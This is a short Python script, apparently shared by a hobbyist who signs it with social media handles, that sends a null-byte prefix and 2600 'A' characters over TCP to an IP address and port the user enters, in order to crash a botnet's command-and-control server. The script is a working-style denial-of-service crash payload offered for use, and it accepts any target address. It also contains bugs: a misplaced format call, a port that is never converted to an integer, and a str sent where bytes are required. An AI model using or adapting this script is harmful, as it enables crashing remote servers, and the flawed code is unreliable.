# Date of write: 8/28/2020

#Purpose of the script: a buffer overflow to crash the C2, so then they have to rescreen.

#IG: @imdoxed 
#OGU: obstacles 
#Twitter: @ItsObstacles

import socket 

server_ip = input("IP: ")
c2_port = input("C2 Port: ")

print("Dropping {server_ip}").format(server_ip)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #opens a TCP socket
c2connection = s.connect((server_ip,c2_port))
s.send('\x00\x00'+"A"*2600+'\r\n') #sending data
s.close() #closing the TCP socket




#This is a rewrite, just a tiny change to the orginal script. I dont remember the person who did the first write on this.


#IHateBotnetRetards

